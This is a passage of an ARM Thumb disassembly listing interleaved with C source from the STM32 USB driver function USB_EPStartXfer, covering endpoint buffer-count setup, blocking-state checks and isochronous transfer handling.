 8007a44:	b29b      	uxth	r3, r3
 8007a46:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007a4a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007a4e:	b29a      	uxth	r2, r3
 8007a50:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a54:	801a      	strh	r2, [r3, #0]
 8007a56:	e05b      	b.n	8007b10 <USB_EPStartXfer+0x10ea>
 8007a58:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a5c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a60:	681b      	ldr	r3, [r3, #0]
 8007a62:	691b      	ldr	r3, [r3, #16]
 8007a64:	085b      	lsrs	r3, r3, #1
 8007a66:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007a6a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a6e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a72:	681b      	ldr	r3, [r3, #0]
 8007a74:	691b      	ldr	r3, [r3, #16]
 8007a76:	f003 0301 	and.w	r3, r3, #1
 8007a7a:	2b00      	cmp	r3, #0
 8007a7c:	d004      	beq.n	8007a88 <USB_EPStartXfer+0x1062>
 8007a7e:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007a82:	3301      	adds	r3, #1
 8007a84:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007a88:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a8c:	881b      	ldrh	r3, [r3, #0]
 8007a8e:	b29a      	uxth	r2, r3
 8007a90:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007a94:	b29b      	uxth	r3, r3
 8007a96:	029b      	lsls	r3, r3, #10
 8007a98:	b29b      	uxth	r3, r3
 8007a9a:	4313      	orrs	r3, r2
 8007a9c:	b29a      	uxth	r2, r3
 8007a9e:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007aa2:	801a      	strh	r2, [r3, #0]
 8007aa4:	e034      	b.n	8007b10 <USB_EPStartXfer+0x10ea>
 8007aa6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007aaa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007aae:	681b      	ldr	r3, [r3, #0]
 8007ab0:	785b      	ldrb	r3, [r3, #1]
 8007ab2:	2b01      	cmp	r3, #1
 8007ab4:	d12c      	bne.n	8007b10 <USB_EPStartXfer+0x10ea>
 8007ab6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007aba:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007abe:	681b      	ldr	r3, [r3, #0]
 8007ac0:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007ac4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ac8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007acc:	681b      	ldr	r3, [r3, #0]
 8007ace:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007ad2:	b29b      	uxth	r3, r3
 8007ad4:	461a      	mov	r2, r3
 8007ad6:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007ada:	4413      	add	r3, r2
 8007adc:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007ae0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ae4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ae8:	681b      	ldr	r3, [r3, #0]
 8007aea:	781b      	ldrb	r3, [r3, #0]
 8007aec:	00da      	lsls	r2, r3, #3
 8007aee:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007af2:	4413      	add	r3, r2
 8007af4:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007af8:	f8c7 30b0 	str.w	r3, [r7, #176]	; 0xb0
 8007afc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b00:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b04:	681b      	ldr	r3, [r3, #0]
 8007b06:	691b      	ldr	r3, [r3, #16]
 8007b08:	b29a      	uxth	r2, r3
 8007b0a:	f8d7 30b0 	ldr.w	r3, [r7, #176]	; 0xb0
 8007b0e:	801a      	strh	r2, [r3, #0]
 8007b10:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b14:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b18:	681b      	ldr	r3, [r3, #0]
 8007b1a:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007b1e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b22:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b26:	681b      	ldr	r3, [r3, #0]
 8007b28:	785b      	ldrb	r3, [r3, #1]
 8007b2a:	2b00      	cmp	r3, #0
 8007b2c:	f040 809d 	bne.w	8007c6a <USB_EPStartXfer+0x1244>
 8007b30:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b34:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b38:	681b      	ldr	r3, [r3, #0]
 8007b3a:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007b3e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b42:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b46:	681b      	ldr	r3, [r3, #0]
 8007b48:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007b4c:	b29b      	uxth	r3, r3
 8007b4e:	461a      	mov	r2, r3
 8007b50:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007b54:	4413      	add	r3, r2
 8007b56:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007b5a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b5e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b62:	681b      	ldr	r3, [r3, #0]
 8007b64:	781b      	ldrb	r3, [r3, #0]
 8007b66:	00da      	lsls	r2, r3, #3
 8007b68:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007b6c:	4413      	add	r3, r2
 8007b6e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007b72:	f8c7 3098 	str.w	r3, [r7, #152]	; 0x98
 8007b76:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007b7a:	881b      	ldrh	r3, [r3, #0]
 8007b7c:	b29b      	uxth	r3, r3
 8007b7e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007b82:	b29a      	uxth	r2, r3
 8007b84:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007b88:	801a      	strh	r2, [r3, #0]
 8007b8a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b8e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b92:	681b      	ldr	r3, [r3, #0]
 8007b94:	691b      	ldr	r3, [r3, #16]
 8007b96:	2b3e      	cmp	r3, #62	; 0x3e
 8007b98:	d92b      	bls.n	8007bf2 <USB_EPStartXfer+0x11cc>
 8007b9a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b9e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ba2:	681b      	ldr	r3, [r3, #0]
 8007ba4:	691b      	ldr	r3, [r3, #16]
 8007ba6:	095b      	lsrs	r3, r3, #5
 8007ba8:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007bac:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bb0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bb4:	681b      	ldr	r3, [r3, #0]
 8007bb6:	691b      	ldr	r3, [r3, #16]
 8007bb8:	f003 031f 	and.w	r3, r3, #31
 8007bbc:	2b00      	cmp	r3, #0
 8007bbe:	d104      	bne.n	8007bca <USB_EPStartXfer+0x11a4>
 8007bc0:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007bc4:	3b01      	subs	r3, #1
 8007bc6:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007bca:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007bce:	881b      	ldrh	r3, [r3, #0]
 8007bd0:	b29a      	uxth	r2, r3
 8007bd2:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007bd6:	b29b      	uxth	r3, r3
 8007bd8:	029b      	lsls	r3, r3, #10
 8007bda:	b29b      	uxth	r3, r3
 8007bdc:	4313      	orrs	r3, r2
 8007bde:	b29b      	uxth	r3, r3
 8007be0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007be4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007be8:	b29a      	uxth	r2, r3
 8007bea:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007bee:	801a      	strh	r2, [r3, #0]
 8007bf0:	e069      	b.n	8007cc6 <USB_EPStartXfer+0x12a0>
 8007bf2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bf6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bfa:	681b      	ldr	r3, [r3, #0]
 8007bfc:	691b      	ldr	r3, [r3, #16]
 8007bfe:	2b00      	cmp	r3, #0
 8007c00:	d10c      	bne.n	8007c1c <USB_EPStartXfer+0x11f6>
 8007c02:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c06:	881b      	ldrh	r3, [r3, #0]
 8007c08:	b29b      	uxth	r3, r3
 8007c0a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007c0e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007c12:	b29a      	uxth	r2, r3
 8007c14:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c18:	801a      	strh	r2, [r3, #0]
 8007c1a:	e054      	b.n	8007cc6 <USB_EPStartXfer+0x12a0>
 8007c1c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c20:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c24:	681b      	ldr	r3, [r3, #0]
 8007c26:	691b      	ldr	r3, [r3, #16]
 8007c28:	085b      	lsrs	r3, r3, #1
 8007c2a:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007c2e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c32:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c36:	681b      	ldr	r3, [r3, #0]
 8007c38:	691b      	ldr	r3, [r3, #16]
 8007c3a:	f003 0301 	and.w	r3, r3, #1
 8007c3e:	2b00      	cmp	r3, #0
 8007c40:	d004      	beq.n	8007c4c <USB_EPStartXfer+0x1226>
 8007c42:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007c46:	3301      	adds	r3, #1
 8007c48:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007c4c:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c50:	881b      	ldrh	r3, [r3, #0]
 8007c52:	b29a      	uxth	r2, r3
 8007c54:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007c58:	b29b      	uxth	r3, r3
 8007c5a:	029b      	lsls	r3, r3, #10
 8007c5c:	b29b      	uxth	r3, r3
 8007c5e:	4313      	orrs	r3, r2
 8007c60:	b29a      	uxth	r2, r3
 8007c62:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c66:	801a      	strh	r2, [r3, #0]
 8007c68:	e02d      	b.n	8007cc6 <USB_EPStartXfer+0x12a0>
 8007c6a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c6e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c72:	681b      	ldr	r3, [r3, #0]
 8007c74:	785b      	ldrb	r3, [r3, #1]
 8007c76:	2b01      	cmp	r3, #1
 8007c78:	d125      	bne.n	8007cc6 <USB_EPStartXfer+0x12a0>
 8007c7a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c7e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007c82:	681b      	ldr	r3, [r3, #0]
 8007c84:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007c88:	b29b      	uxth	r3, r3
 8007c8a:	461a      	mov	r2, r3
 8007c8c:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007c90:	4413      	add	r3, r2
 8007c92:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007c96:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c9a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c9e:	681b      	ldr	r3, [r3, #0]
 8007ca0:	781b      	ldrb	r3, [r3, #0]
 8007ca2:	00da      	lsls	r2, r3, #3
 8007ca4:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007ca8:	4413      	add	r3, r2
 8007caa:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007cae:	f8c7 30a0 	str.w	r3, [r7, #160]	; 0xa0
 8007cb2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cb6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cba:	681b      	ldr	r3, [r3, #0]
 8007cbc:	691b      	ldr	r3, [r3, #16]
 8007cbe:	b29a      	uxth	r2, r3
 8007cc0:	f8d7 30a0 	ldr.w	r3, [r7, #160]	; 0xa0
 8007cc4:	801a      	strh	r2, [r3, #0]

        /* Coming from ISR */
        if (ep->xfer_count != 0U)
 8007cc6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cca:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cce:	681b      	ldr	r3, [r3, #0]
 8007cd0:	69db      	ldr	r3, [r3, #28]
 8007cd2:	2b00      	cmp	r3, #0
 8007cd4:	f000 8218 	beq.w	8008108 <USB_EPStartXfer+0x16e2>
        {
          /* update last value to check if there is blocking state */
          wEPVal = PCD_GET_ENDPOINT(USBx, ep->num);
 8007cd8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cdc:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ce0:	681a      	ldr	r2, [r3, #0]
 8007ce2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ce6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cea:	681b      	ldr	r3, [r3, #0]
 8007cec:	781b      	ldrb	r3, [r3, #0]
 8007cee:	009b      	lsls	r3, r3, #2
 8007cf0:	4413      	add	r3, r2
 8007cf2:	881b      	ldrh	r3, [r3, #0]
 8007cf4:	f8a7 3096 	strh.w	r3, [r7, #150]	; 0x96

          /*Blocking State */
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007cf8:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007cfc:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8007d00:	2b00      	cmp	r3, #0
 8007d02:	d005      	beq.n	8007d10 <USB_EPStartXfer+0x12ea>
 8007d04:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007d08:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007d0c:	2b00      	cmp	r3, #0
 8007d0e:	d10d      	bne.n	8007d2c <USB_EPStartXfer+0x1306>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007d10:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007d14:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007d18:	2b00      	cmp	r3, #0
 8007d1a:	f040 81f5 	bne.w	8008108 <USB_EPStartXfer+0x16e2>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007d1e:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007d22:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007d26:	2b00      	cmp	r3, #0
 8007d28:	f040 81ee 	bne.w	8008108 <USB_EPStartXfer+0x16e2>
          {
            PCD_FREE_USER_BUFFER(USBx, ep->num, 0U);
 8007d2c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d30:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d34:	681a      	ldr	r2, [r3, #0]
 8007d36:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d3a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d3e:	681b      	ldr	r3, [r3, #0]
 8007d40:	781b      	ldrb	r3, [r3, #0]
 8007d42:	009b      	lsls	r3, r3, #2
 8007d44:	4413      	add	r3, r2
 8007d46:	881b      	ldrh	r3, [r3, #0]
 8007d48:	b29b      	uxth	r3, r3
 8007d4a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8007d4e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8007d52:	f8a7 3094 	strh.w	r3, [r7, #148]	; 0x94
 8007d56:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d5a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d5e:	681a      	ldr	r2, [r3, #0]
 8007d60:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d64:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d68:	681b      	ldr	r3, [r3, #0]
 8007d6a:	781b      	ldrb	r3, [r3, #0]
 8007d6c:	009b      	lsls	r3, r3, #2
 8007d6e:	441a      	add	r2, r3
 8007d70:	f8b7 3094 	ldrh.w	r3, [r7, #148]	; 0x94
 8007d74:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007d78:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007d7c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007d80:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8007d84:	b29b      	uxth	r3, r3
 8007d86:	8013      	strh	r3, [r2, #0]
 8007d88:	e1be      	b.n	8008108 <USB_EPStartXfer+0x16e2>
          }
        }
      }
      /* iso out double */
      else if (ep->type == EP_TYPE_ISOC)
 8007d8a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d8e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d92:	681b      	ldr	r3, [r3, #0]
 8007d94:	78db      	ldrb	r3, [r3, #3]
 8007d96:	2b01      	cmp	r3, #1
 8007d98:	f040 81b4 	bne.w	8008104 <USB_EPStartXfer+0x16de>
      {
        /* Multi packet transfer */
        if (ep->xfer_len > ep->maxpacket)
 8007d9c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007da0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007da4:	681b      	ldr	r3, [r3, #0]
 8007da6:	699a      	ldr	r2, [r3, #24]
 8007da8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dac:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007db0:	681b      	ldr	r3, [r3, #0]
 8007db2:	691b      	ldr	r3, [r3, #16]
 8007db4:	429a      	cmp	r2, r3
 8007db6:	d917      	bls.n	8007de8 <USB_EPStartXfer+0x13c2>
        {
          len = ep->maxpacket;
 8007db8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dbc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dc0:	681b      	ldr	r3, [r3, #0]
 8007dc2:	691b      	ldr	r3, [r3, #16]
 8007dc4:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len -= len;
 8007dc8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dcc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dd0:	681b      	ldr	r3, [r3, #0]
 8007dd2:	699a      	ldr	r2, [r3, #24]
 8007dd4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007dd8:	1ad2      	subs	r2, r2, r3
 8007dda:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dde:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007de2:	681b      	ldr	r3, [r3, #0]
 8007de4:	619a      	str	r2, [r3, #24]
 8007de6:	e00e      	b.n	8007e06 <USB_EPStartXfer+0x13e0>
        }
        else
        {
          len = ep->xfer_len;
 8007de8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dec:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007df0:	681b      	ldr	r3, [r3, #0]
 8007df2:	699b      	ldr	r3, [r3, #24]
 8007df4:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len = 0U;
 8007df8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dfc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e00:	681b      	ldr	r3, [r3, #0]
 8007e02:	2200      	movs	r2, #0
 8007e04:	619a      	str	r2, [r3, #24]
        }
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, len);
 8007e06:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e0a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e0e:	681b      	ldr	r3, [r3, #0]
 8007e10:	785b      	ldrb	r3, [r3, #1]
 8007e12:	2b00      	cmp	r3, #0
 8007e14:	f040 8085 	bne.w	8007f22 <USB_EPStartXfer+0x14fc>
 8007e18:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e1c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007e20:	681b      	ldr	r3, [r3, #0]
 8007e22:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 8007e26:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e2a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007e2e:	681b      	ldr	r3, [r3, #0]
 8007e30:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007e34:	b29b      	uxth	r3, r3
 8007e36:	461a      	mov	r2, r3
 8007e38:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8007e3c:	4413      	add	r3, r2
 8007e3e:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 8007e42:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e46:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e4a:	681b      	ldr	r3, [r3, #0]
 8007e4c:	781b      	ldrb	r3, [r3, #0]
 8007e4e:	00da      	lsls	r2, r3, #3
 8007e50:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8007e54:	4413      	add	r3, r2
 8007e56:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007e5a:	f8c7 30c8 	str.w	r3, [r7, #200]	; 0xc8
 8007e5e:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007e62:	881b      	ldrh	r3, [r3, #0]
 8007e64:	b29b      	uxth	r3, r3
 8007e66:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007e6a:	b29a      	uxth	r2, r3
 8007e6c:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007e70:	801a      	strh	r2, [r3, #0]
 8007e72:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e76:	2b3e      	cmp	r3, #62	; 0x3e
 8007e78:	d923      	bls.n	8007ec2 <USB_EPStartXfer+0x149c>
 8007e7a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e7e:	095b      	lsrs	r3, r3, #5
 8007e80:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007e84:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e88:	f003 031f 	and.w	r3, r3, #31
 8007e8c:	2b00      	cmp	r3, #0
 8007e8e:	d104      	bne.n	8007e9a <USB_EPStartXfer+0x1474>
 8007e90:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007e94:	3b01      	subs	r3, #1
 8007e96:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007e9a:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007e9e:	881b      	ldrh	r3, [r3, #0]
 8007ea0:	b29a      	uxth	r2, r3
 8007ea2:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007ea6:	b29b      	uxth	r3, r3
 8007ea8:	029b      	lsls	r3, r3, #10
 8007eaa:	b29b      	uxth	r3, r3
 8007eac:	4313      	orrs	r3, r2
 8007eae:	b29b      	uxth	r3, r3
 8007eb0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007eb4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007eb8:	b29a      	uxth	r2, r3
 8007eba:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007ebe:	801a      	strh	r2, [r3, #0]
 8007ec0:	e060      	b.n	8007f84 <USB_EPStartXfer+0x155e>
 8007ec2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ec6:	2b00      	cmp	r3, #0
 8007ec8:	d10c      	bne.n	8007ee4 <USB_EPStartXfer+0x14be>
 8007eca:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007ece:	881b      	ldrh	r3, [r3, #0]
 8007ed0:	b29b      	uxth	r3, r3
 8007ed2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007ed6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007eda:	b29a      	uxth	r2, r3
 8007edc:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007ee0:	801a      	strh	r2, [r3, #0]
 8007ee2:	e04f      	b.n	8007f84 <USB_EPStartXfer+0x155e>
 8007ee4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ee8:	085b      	lsrs	r3, r3, #1
 8007eea:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007eee:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ef2:	f003 0301 	and.w	r3, r3, #1
 8007ef6:	2b00      	cmp	r3, #0
 8007ef8:	d004      	beq.n	8007f04 <USB_EPStartXfer+0x14de>
 8007efa:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007efe:	3301      	adds	r3, #1
 8007f00:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007f04:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007f08:	881b      	ldrh	r3, [r3, #0]
 8007f0a:	b29a      	uxth	r2, r3
 8007f0c:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007f10:	b29b      	uxth	r3, r3
 8007f12:	029b      	lsls	r3, r3, #10
 8007f14:	b29b      	uxth	r3, r3
 8007f16:	4313      	orrs	r3, r2
 8007f18:	b29a      	uxth	r2, r3
 8007f1a:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007f1e:	801a      	strh	r2, [r3, #0]
 8007f20:	e030      	b.n	8007f84 <USB_EPStartXfer+0x155e>
 8007f22:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f26:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f2a:	681b      	ldr	r3, [r3, #0]
 8007f2c:	785b      	ldrb	r3, [r3, #1]
 8007f2e:	2b01      	cmp	r3, #1
 8007f30:	d128      	bne.n	8007f84 <USB_EPStartXfer+0x155e>
 8007f32:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f36:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f3a:	681b      	ldr	r3, [r3, #0]
 8007f3c:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 8007f40:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f44:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f48:	681b      	ldr	r3, [r3, #0]
 8007f4a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007f4e:	b29b      	uxth	r3, r3
 8007f50:	461a      	mov	r2, r3
 8007f52:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 8007f56:	4413      	add	r3, r2
 8007f58:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 8007f5c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f60:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f64:	681b      	ldr	r3, [r3, #0]
 8007f66:	781b      	ldrb	r3, [r3, #0]
 8007f68:	00da      	lsls	r2, r3, #3
 8007f6a:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 8007f6e:	4413      	add	r3, r2
 8007f70:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007f74:	f8c7 30d0 	str.w	r3, [r7, #208]	; 0xd0
 8007f78:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007f7c:	b29a      	uxth	r2, r3
 8007f7e:	f8d7 30d0 	ldr.w	r3, [r7, #208]	; 0xd0
 8007f82:	801a      	strh	r2, [r3, #0]
 8007f84:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f88:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f8c:	681b      	ldr	r3, [r3, #0]
 8007f8e:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 8007f92:	f507 7384 	add.w	r3, r7, #264	; 0x108
